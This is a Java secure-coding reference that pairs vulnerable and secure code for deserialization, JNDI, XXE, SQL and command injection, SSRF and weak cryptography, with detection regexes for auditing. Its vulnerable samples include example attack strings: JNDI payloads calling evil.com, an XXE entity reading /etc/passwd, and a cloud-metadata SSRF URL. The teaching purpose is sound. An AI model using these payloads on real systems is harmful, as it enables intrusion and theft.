# Java Security Features by Version

Modern Java versions introduce language features and API improvements that directly improve security when used correctly. This reference documents security-relevant features and common vulnerability patterns from Java 11 through Java 21.

## Core Java Security Patterns

### ObjectInputStream Insecure Deserialization

Java serialization is one of the most dangerous features in the language. Deserializing untrusted data can lead to remote code execution through gadget chains present in common libraries.

```java
// VULNERABLE: Deserializing untrusted input without filtering
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject(); // RCE if attacker controls the stream
```

```java
// SECURE: Use ObjectInputFilter (Java 9+) to restrict allowed classes
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
ois.setObjectInputFilter(ObjectInputFilter.Config.createFilter(
    "com.example.dto.*;!*"  // Allow only known DTO classes, reject everything else
));
Object obj = ois.readObject();

// SECURE: Avoid Java serialization entirely — use JSON and bind to a
// concrete type. Do NOT enable Jackson default typing; it reintroduces
// polymorphic deserialization, which is the exact same gadget-chain
// attack surface we are trying to remove. If polymorphism is genuinely
// required, supply a strict PolymorphicTypeValidator that allowlists
// specific base types and reject everything else.
ObjectMapper mapper = new ObjectMapper();
UserDto user = mapper.readValue(input, UserDto.class);
```

**Security implication:** Insecure deserialization (CWE-502) enables remote code execution. Gadget chains in libraries like Commons Collections, Spring, and Hibernate can be exploited through crafted serialized objects. Avoid `ObjectInputStream` on untrusted data entirely; if unavoidable, use `ObjectInputFilter` to allowlist specific classes.

**Detection regex:** `new\s+ObjectInputStream\s*\(`

---

### XMLDecoder Deserialization

`XMLDecoder` deserializes XML into arbitrary Java objects and can execute arbitrary method calls defined in the XML, making it equivalent to code execution.

```java
// VULNERABLE: XMLDecoder on untrusted input
XMLDecoder decoder = new XMLDecoder(request.getInputStream());
Object result = decoder.readObject(); // Arbitrary code execution
decoder.close();
```

```java
// SECURE: Use JAXB or Jackson XML with explicit type binding
JAXBContext context = JAXBContext.newInstance(UserDto.class);
Unmarshaller unmarshaller = context.createUnmarshaller();
UserDto user = (UserDto) unmarshaller.unmarshal(request.getInputStream());
```

**Security implication:** `XMLDecoder` can instantiate arbitrary classes and call arbitrary methods. An attacker-controlled XML stream can achieve full remote code execution (CWE-502). Never use `XMLDecoder` on untrusted input.

**Detection regex:** `new\s+XMLDecoder\s*\(`

---

### JNDI Injection (Log4Shell Pattern)

JNDI lookups with attacker-controlled input allow loading remote classes, as demonstrated by the Log4Shell vulnerability (CVE-2021-44228).

```java
// VULNERABLE: JNDI lookup with user-controlled input
String name = request.getParameter("resource");
InitialContext ctx = new InitialContext();
Object obj = ctx.lookup(name); // Attacker sends "ldap://evil.com/Exploit"

// VULNERABLE: Log4j pattern (pre-2.17.0)
logger.info("User logged in: " + username); // username = "${jndi:ldap://evil.com/a}"
```

```java
// SECURE: Validate JNDI names against an allowlist
private static final Set<String> ALLOWED_JNDI = Set.of(
    "java:comp/env/jdbc/mydb",
    "java:comp/env/mail/session"
);

String name = request.getParameter("resource");
if (!ALLOWED_JNDI.contains(name)) {
    throw new SecurityException("Disallowed JNDI name: " + name);
}
InitialContext ctx = new InitialContext();
Object obj = ctx.lookup(name);

// SECURE: Use Log4j 2.17.1+ with lookup disabled (default)
// log4j2.formatMsgNoLookups=true (default since 2.17.0)
```

**Security implication:** JNDI injection (CWE-917) allows remote class loading and code execution. The Log4Shell vulnerability demonstrated how pervasive this risk is. Always validate JNDI names against a strict allowlist and keep Log4j updated.

**Detection regex:** `InitialContext\s*\(\s*\)[\s\S]{0,100}\.lookup\s*\(`

---

### Reflection Abuse

Java reflection can bypass access controls, invoke private methods, and instantiate arbitrary classes when fed attacker-controlled input.

```java
// VULNERABLE: Class instantiation from user input
String className = request.getParameter("handler");
Class<?> clazz = Class.forName(className);
Object handler = clazz.getDeclaredConstructor().newInstance();
((Handler) handler).handle(request);

// VULNERABLE: Method invocation from user input
String methodName = request.getParameter("action");
Method method = service.getClass().getMethod(methodName, Request.class);
method.invoke(service, request);
```

```java
// SECURE: Map user input to known handlers
private static final Map<String, Supplier<Handler>> HANDLERS = Map.of(
    "upload", UploadHandler::new,
    "download", DownloadHandler::new,
    "delete", DeleteHandler::new
);

String handlerName = request.getParameter("handler");
Supplier<Handler> factory = HANDLERS.get(handlerName);
if (factory == null) {
    throw new IllegalArgumentException("Unknown handler: " + handlerName);
}
Handler handler = factory.get();
handler.handle(request);
```

**Security implication:** Reflection with user input (CWE-470) allows instantiation of arbitrary classes, including system-level classes that can read files, execute commands, or modify security settings. Always use allowlists or factory patterns instead.

**Detection regex:** `Class\.forName\s*\(|Method\.invoke\s*\(`

---

### SQL Injection in JDBC

String concatenation in SQL queries is the classic SQL injection vector in Java applications.

```java
// VULNERABLE: String concatenation in SQL
String query = "SELECT * FROM users WHERE username = '" + username + "'";
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);

// VULNERABLE: String format in SQL
String query = String.format("SELECT * FROM users WHERE id = %s", userId);
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery(query);
```

```java
// SECURE: Use PreparedStatement with parameterized queries
String query = "SELECT * FROM users WHERE username = ?";
PreparedStatement pstmt = connection.prepareStatement(query);
pstmt.setString(1, username);
ResultSet rs = pstmt.executeQuery();

// SECURE: JPA with named parameters
TypedQuery<User> query = em.createQuery(
    "SELECT u FROM User u WHERE u.username = :username", User.class);
query.setParameter("username", username);
User user = query.getSingleResult();
```

**Security implication:** SQL injection (CWE-89) allows attackers to read, modify, or delete database data, and potentially execute system commands. Always use parameterized queries through `PreparedStatement` or JPA named parameters.

**Detection regex:** `(createStatement|executeQuery|executeUpdate)\s*\([^)]*\+`

---

### XML External Entities (XXE)

`DocumentBuilderFactory` and other XML parsers in Java are vulnerable to XXE by default if external entities are not explicitly disabled.

```java
// VULNERABLE: Default DocumentBuilderFactory allows XXE
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(request.getInputStream());
// Attacker can read files: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

```java
// SECURE: Disable external entities and DTDs
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(request.getInputStream());

// SECURE: Use SAXParserFactory with same protections
SAXParserFactory spf = SAXParserFactory.newInstance();
spf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

**Security implication:** XXE (CWE-611) allows reading local files, SSRF, and denial of service via entity expansion. Java XML parsers are vulnerable by default. Always disable external entities and DTD processing.

**Detection regex:** `DocumentBuilderFactory\.newInstance\s*\(`

---

### Command Injection via Runtime.exec

Using `Runtime.exec` or `ProcessBuilder` with user-controlled arguments enables command injection.

```java
// VULNERABLE: User input in command execution
String filename = request.getParameter("file");
Runtime.getRuntime().exec("convert " + filename + " output.pdf");

// VULNERABLE: ProcessBuilder with unsanitized input
String host = request.getParameter("host");
ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", host);
Process p = pb.start();
```

```java
// SECURE: Validate input against allowlist, never concatenate
String filename = request.getParameter("file");
if (!filename.matches("[a-zA-Z0-9_-]+\\.(png|jpg|gif)")) {
    throw new IllegalArgumentException("Invalid filename");
}
// Use array form to avoid shell interpretation
ProcessBuilder pb = new ProcessBuilder("convert", filename, "output.pdf");
pb.redirectErrorStream(true);
Process p = pb.start();

// SECURE: Use library APIs instead of shell commands
BufferedImage image = ImageIO.read(new File(validatedPath));
```

**Security implication:** Command injection (CWE-78) via `Runtime.exec` with string concatenation passes input through the shell, enabling command chaining. Use the array form of `ProcessBuilder` and validate inputs against strict patterns.

**Detection regex:** `Runtime\.getRuntime\s*\(\s*\)\s*\.exec\s*\(`

---

### Path Traversal

Constructing file paths from user input without validation allows directory traversal attacks.

```java
// VULNERABLE: Direct use of user input in file paths
String filename = request.getParameter("file");
File file = new File("/uploads/" + filename);
// Attacker sends "../../etc/passwd"
FileInputStream fis = new FileInputStream(file);
```

```java
// SECURE: Validate canonical path stays within allowed directory
String filename = request.getParameter("file");
File baseDir = new File("/uploads").getCanonicalFile();
File requestedFile = new File(baseDir, filename).getCanonicalFile();

if (!requestedFile.toPath().startsWith(baseDir.toPath())) {
    throw new SecurityException("Path traversal detected");
}
FileInputStream fis = new FileInputStream(requestedFile);

// SECURE: Java NIO with path normalization
Path basePath = Path.of("/uploads").toRealPath();
Path resolved = basePath.resolve(filename).normalize().toRealPath();
if (!resolved.startsWith(basePath)) {
    throw new SecurityException("Path traversal detected");
}
```

**Security implication:** Path traversal (CWE-22) allows reading or writing arbitrary files on the server. Always resolve to canonical/real paths and verify the result stays within the intended directory.

**Detection regex:** `new\s+File\s*\(\s*[^)]*\+\s*(request|req|param|input|args)`

---

### Weak Cryptography

Use of broken or weak cryptographic algorithms creates false sense of security.

```java
// VULNERABLE: MD5 is broken for integrity verification
MessageDigest md = MessageDigest.getInstance("MD5");
byte[] hash = md.digest(data);

// VULNERABLE: SHA-1 is deprecated for security use
MessageDigest sha1 = MessageDigest.getInstance("SHA-1");

// VULNERABLE: DES is broken (56-bit key)
Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");

// VULNERABLE: ECB mode leaks patterns
Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");

// VULNERABLE: Insecure random for security-sensitive operations
java.util.Random rand = new java.util.Random();
String token = Long.toHexString(rand.nextLong());
```

```java
// SECURE: SHA-256 or stronger
MessageDigest sha256 = MessageDigest.getInstance("SHA-256");
byte[] hash = sha256.digest(data);

// SECURE: AES-GCM for authenticated encryption
Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
GCMParameterSpec spec = new GCMParameterSpec(128, iv);
cipher.init(Cipher.ENCRYPT_MODE, secretKey, spec);

// SECURE: SecureRandom for security-sensitive operations
SecureRandom random = new SecureRandom();
byte[] token = new byte[32];
random.nextBytes(token);
String tokenStr = Base64.getUrlEncoder().withoutPadding().encodeToString(token);
```

**Security implication:** Weak hash algorithms (CWE-328) like MD5 and SHA-1 are vulnerable to collision attacks. DES (CWE-327) has insufficient key length. ECB mode (CWE-327) leaks data patterns. `java.util.Random` (CWE-338) is predictable and must not be used for tokens or keys.

**Detection regex (MD5/SHA-1):** `getInstance\s*\(\s*"(MD5|SHA-1)"\s*\)`
**Detection regex (DES/ECB):** `Cipher\.getInstance\s*\(\s*"(DES|.*ECB)`
**Detection regex (insecure random):** `new\s+Random\s*\(`

---

### SSRF via URL.openConnection

Using `URL.openConnection()` with user-controlled URLs enables Server-Side Request Forgery.

```java
// VULNERABLE: User-controlled URL in HTTP request
String target = request.getParameter("url");
URL url = new URL(target);
HttpURLConnection conn = (HttpURLConnection) url.openConnection();
// Attacker sends http://169.254.169.254/latest/meta-data/ (AWS metadata)
```

```java
// SECURE: Validate URL against allowlist of hosts and schemes
String target = request.getParameter("url");
URL url = new URL(target);

// Validate scheme
if (!Set.of("http", "https").contains(url.getProtocol())) {
    throw new SecurityException("Only HTTP(S) allowed");
}

// Validate host is not internal
InetAddress addr = InetAddress.getByName(url.getHost());
if (addr.isLoopbackAddress() || addr.isLinkLocalAddress()
        || addr.isSiteLocalAddress() || addr.isAnyLocalAddress()) {
    throw new SecurityException("Internal addresses not allowed");
}

HttpURLConnection conn = (HttpURLConnection) url.openConnection();
conn.setInstanceFollowRedirects(false); // Prevent redirect-based bypass
```

**Security implication:** SSRF (CWE-918) allows attackers to reach internal services, cloud metadata endpoints, and other protected resources. Validate URLs against allowlists, block private IP ranges, and disable redirects.

**Detection regex:** `(openConnection|openStream)\s*\(\s*\)`

---

## Java 11+

### HttpClient SSRF Considerations

Java 11 introduced `java.net.http.HttpClient`, a modern HTTP client. Like `URL.openConnection`, it is vulnerable to SSRF if the target URL is user-controlled.

```java
// VULNERABLE: HttpClient with user-controlled URI
String target = request.getParameter("url");
HttpClient client = HttpClient.newHttpClient();
HttpRequest req = HttpRequest.newBuilder()
    .uri(URI.create(target))
    .build();
HttpResponse<String> resp = client.send(req, HttpResponse.BodyHandlers.ofString());
```

```java
// SECURE: Validate URI before use with HttpClient
String target = request.getParameter("url");
URI uri = URI.create(target);

// Validate scheme and host
if (!Set.of("http", "https").contains(uri.getScheme())) {
    throw new SecurityException("Only HTTP(S) allowed");
}
InetAddress addr = InetAddress.getByName(uri.getHost());
if (addr.isLoopbackAddress() || addr.isLinkLocalAddress()
        || addr.isSiteLocalAddress()) {
    throw new SecurityException("Internal addresses blocked");
}

HttpClient client = HttpClient.newBuilder()
    .followRedirects(HttpClient.Redirect.NEVER) // Block redirect-based SSRF
    .connectTimeout(Duration.ofSeconds(5))
    .build();
HttpRequest req = HttpRequest.newBuilder()
    .uri(uri)
    .timeout(Duration.ofSeconds(10))
    .build();
HttpResponse<String> resp = client.send(req, HttpResponse.BodyHandlers.ofString());
```

**Security implication:** The new `HttpClient` shares the same SSRF risks as legacy `URL.openConnection`. Apply the same validation — scheme allowlist, host allowlist, private IP blocking, and redirect prevention.

**Detection regex:** `HttpClient\.new(HttpClient|Builder)\s*\(`

---

### Enhanced String Methods for Input Validation

Java 11 adds `String.isBlank()`, `String.strip()`, and `String.lines()` that improve input handling.

```java
// VULNERABLE: Using trim() which only handles ASCII whitespace
String input = request.getParameter("token");
if (input != null && !input.trim().isEmpty()) {
    // Unicode whitespace characters can bypass this check
    processToken(input.trim());
}
```

```java
// SECURE: strip() handles all Unicode whitespace
String input = request.getParameter("token");
if (input != null && !input.strip().isBlank()) {
    processToken(input.strip());
}
```

**Security implication:** `trim()` only removes ASCII whitespace (`\u0020` and below), while `strip()` handles all Unicode whitespace characters. Attackers can use Unicode whitespace to bypass validation that relies on `trim()`.

---

## Java 14+

### Records for Immutable Data Transfer

Records provide immutable data carriers that eliminate entire classes of bugs related to mutable state.

```java
// VULNERABLE: Mutable DTO allows tampering after validation
public class UserRequest {
    private String username;
    private String role;

    // Setters allow modification after validation
    public void setUsername(String u) { this.username = u; }
    public void setRole(String r) { this.role = r; }
    public String getUsername() { return username; }
    public String getRole() { return role; }
}

// Validated, then attacker mutates before use
UserRequest req = parseAndValidate(input);
req.setRole("admin"); // TOCTOU — modify after validation
```

```java
// SECURE: Record is immutable after construction
public record UserRequest(String username, String role) {
    // Compact constructor for validation at creation time
    public UserRequest {
        Objects.requireNonNull(username, "username required");
        Objects.requireNonNull(role, "role required");
        if (!Set.of("user", "editor", "viewer").contains(role)) {
            throw new IllegalArgumentException("Invalid role: " + role);
        }
    }
}

// Cannot be modified after construction and validation
UserRequest req = new UserRequest(username, role);
// req has no setters — immutable by design
```

**Security implication:** Records enforce immutability, preventing TOCTOU (time-of-check-time-of-use, CWE-367) vulnerabilities where data is modified between validation and use. The compact constructor pattern ensures validation happens at construction time.

---

## Java 17+

### Sealed Classes for Type Safety

Sealed classes restrict which classes can extend them, enabling exhaustive type checking and preventing unauthorized extensions.

```java
// VULNERABLE: Open hierarchy allows unauthorized implementations
public interface Permission { boolean isAllowed(); }

// Attacker adds: class EvilPermission implements Permission {
//     public boolean isAllowed() { return true; } // Always grants access
// }
```

```java
// SECURE: Sealed interface restricts implementations
public sealed interface Permission permits ReadPermission, WritePermission, AdminPermission {
    boolean isAllowed(User user, Resource resource);
}

public record ReadPermission() implements Permission {
    public boolean isAllowed(User user, Resource resource) {
        return resource.isPublic() || user.owns(resource);
    }
}

public record WritePermission() implements Permission {
    public boolean isAllowed(User user, Resource resource) {
        return user.owns(resource);
    }
}

public record AdminPermission() implements Permission {
    public boolean isAllowed(User user, Resource resource) {
        return user.isAdmin();
    }
}
```

**Security implication:** Sealed classes (CWE-284 prevention) ensure that the set of implementations is fixed at compile time. No external code can create a malicious implementation that bypasses security checks. Combined with pattern matching, the compiler enforces exhaustive handling.

---

### Pattern Matching for instanceof

Pattern matching eliminates unsafe casts and enables exhaustive type checks.

```java
// VULNERABLE: Unchecked cast after instanceof
if (obj instanceof String) {
    String s = (String) obj;
    // Risk: cast could be wrong if code is refactored
}

// VULNERABLE: Missing type check
Object credential = getCredential();
String password = (String) credential; // ClassCastException if not String
```

```java
// SECURE: Pattern matching binds and casts safely
if (obj instanceof String s) {
    // s is already cast, no separate cast needed
    process(s);
}

// SECURE: Exhaustive pattern matching with sealed types (Java 21)
switch (permission) {
    case ReadPermission r -> handleRead(r);
    case WritePermission w -> handleWrite(w);
    case AdminPermission a -> handleAdmin(a);
    // Compiler ensures all cases are covered for sealed types
}
```

**Security implication:** Pattern matching eliminates `ClassCastException` risks and, with sealed types, ensures all security-relevant cases are handled. The compiler verifies exhaustiveness.

---

## Java 21+

### Virtual Threads Security Implications

Virtual threads (Project Loom) change the concurrency model. While they improve scalability, they introduce new considerations for thread-local security state.

```java
// VULNERABLE: Thread-local security context may not propagate to virtual threads
private static final ThreadLocal<SecurityContext> secCtx = new ThreadLocal<>();

// In virtual thread, the security context may be missing
Thread.startVirtualThread(() -> {
    SecurityContext ctx = secCtx.get(); // May be null!
    if (ctx == null || !ctx.isAuthenticated()) {
        // Silently fails or throws — DoS risk
    }
});
```

```java
// SECURE: Use ScopedValue (preview) for virtual-thread-safe context
private static final ScopedValue<SecurityContext> SECURITY_CTX = ScopedValue.newInstance();

ScopedValue.runWhere(SECURITY_CTX, authenticatedContext, () -> {
    // Context is safely available in this scope and all child tasks
    SecurityContext ctx = SECURITY_CTX.get();
    processRequest(ctx);
});

// SECURE: Explicitly pass security context through structured concurrency
try (var scope = new StructuredTaskScope.ShutdownOnFailure()) {
    var ctx = SecurityContextHolder.getContext();
    var future = scope.fork(() -> {
        SecurityContextHolder.setContext(ctx);
        return doSecureWork();
    });
    scope.join().throwIfFailed();
    return future.get();
}
```

**Security implication:** Virtual threads do not automatically inherit thread-local security contexts. This can lead to authentication/authorization bypass (CWE-862) if security state is stored in `ThreadLocal`. Migrate to `ScopedValue` or explicitly propagate security context.

---

### Record Patterns for Secure Destructuring

Java 21 record patterns enable deep matching and destructuring of nested records, improving clarity of security checks.

```java
// SECURE: Record pattern matching for access control decisions
sealed interface AuthResult permits Authenticated, Anonymous, Denied {}
record Authenticated(User user, Set<Role> roles) implements AuthResult {}
record Anonymous() implements AuthResult {}
record Denied(String reason) implements AuthResult {}

String handleRequest(AuthResult auth, Resource resource) {
    return switch (auth) {
        case Authenticated(var user, var roles) when roles.contains(Role.ADMIN) ->
            adminAccess(user, resource);
        case Authenticated(var user, var roles) when roles.contains(Role.USER) ->
            userAccess(user, resource);
        case Authenticated(_, _) ->
            forbiddenResponse();
        case Anonymous() ->
            redirectToLogin();
        case Denied(var reason) ->
            deniedResponse(reason);
    };
}
```

**Security implication:** Record patterns with sealed types create a compile-time-verified, exhaustive decision tree for authorization logic. Every combination must be handled, reducing the risk of authorization bypass through unhandled cases.

---

## Detection Patterns for Auditing Java Security Features

The `Regex` column is Markdown table syntax, so pipe characters in regex alternations are escaped as `\|` inside the cell. When you copy a pattern out of the table to run it standalone, unescape the `\|` back to `|`:

```bash
# As written in the table: getInstance\s*\(\s*"(MD5\|SHA-1)"\s*\)
# As run:                   getInstance\s*\(\s*"(MD5|SHA-1)"\s*\)
grep -rnP 'getInstance\s*\(\s*"(MD5|SHA-1)"\s*\)' --include='*.java' .
```

| Pattern | Regex | Severity |
|---------|-------|----------|
| ObjectInputStream deserialization | `new\s+ObjectInputStream\s*\(` | error |
| XMLDecoder deserialization | `new\s+XMLDecoder\s*\(` | error |
| JNDI injection via InitialContext.lookup | `InitialContext\s*\(\s*\)[\s\S]{0,100}\.lookup\s*\(` | error |
| Reflection with Class.forName | `Class\.forName\s*\(` | warning |
| JDBC string concatenation | `(createStatement\|executeQuery\|executeUpdate)\s*\([^)]*\+` | error |
| XXE via DocumentBuilderFactory | `DocumentBuilderFactory\.newInstance\s*\(` | warning |
| Command injection via Runtime.exec | `Runtime\.getRuntime\s*\(\s*\)\s*\.exec\s*\(` | error |
| Path traversal via new File with input | `new\s+File\s*\(\s*[^)]*\+\s*(request\|req\|param\|input\|args)` | warning |
| Weak hash MD5 or SHA-1 | `getInstance\s*\(\s*"(MD5\|SHA-1)"\s*\)` | warning |
| Weak cipher DES or ECB mode | `Cipher\.getInstance\s*\(\s*"(DES\|.*ECB)` | error |
| Insecure random java.util.Random | `new\s+Random\s*\(` | warning |
| SSRF via openConnection | `(openConnection\|openStream)\s*\(\s*\)` | warning |
| SSRF via HttpClient | `HttpClient\.new(HttpClient\|Builder)\s*\(` | warning |
| Method.invoke reflection | `Method\.invoke\s*\(` | warning |
| Unsafe ProcessBuilder with user input | `new\s+ProcessBuilder\s*\(.*\+` | error |

## Version Adoption Security Checklist

- [ ] Upgrade to Java 17+ for sealed classes and enhanced pattern matching
- [ ] Replace `ThreadLocal` security state with `ScopedValue` for virtual threads (Java 21+)
- [ ] Use `ObjectInputFilter` on all remaining `ObjectInputStream` usage
- [ ] Replace mutable DTOs with records for validated, immutable data transfer
- [ ] Verify all XML parsers disable external entities and DTD processing
- [ ] Replace `java.util.Random` with `SecureRandom` for all security-sensitive uses
- [ ] Migrate from DES/3DES to AES-GCM; from MD5/SHA-1 to SHA-256+
- [ ] Use `PreparedStatement` exclusively; search for any `createStatement` usage
- [ ] Audit all `Runtime.exec` and `ProcessBuilder` calls for user input
- [ ] Use `Path.toRealPath()` and boundary checks for all file access with user input
- [ ] Audit JNDI usage and restrict lookup names to an allowlist
- [ ] Disable `XMLDecoder` usage or restrict to trusted internal data only
- [ ] Configure `HttpClient` with `Redirect.NEVER` and validate all user-supplied URIs
- [ ] Enable dependency vulnerability scanning (OWASP Dependency-Check, Snyk)

## Related References

- `owasp-top10.md` — OWASP Top 10 mapping
- `cwe-top25.md` — CWE Top 25 mapping
- `input-validation.md` — Input validation patterns
- `javascript-security-features.md` — JavaScript security features
- `php-security-features.md` — PHP security features

## Changelog

| Date | Change | Reason |
|------|--------|--------|
| 2026-03-31 | Initial release | Phase 2 — Multi-language security references |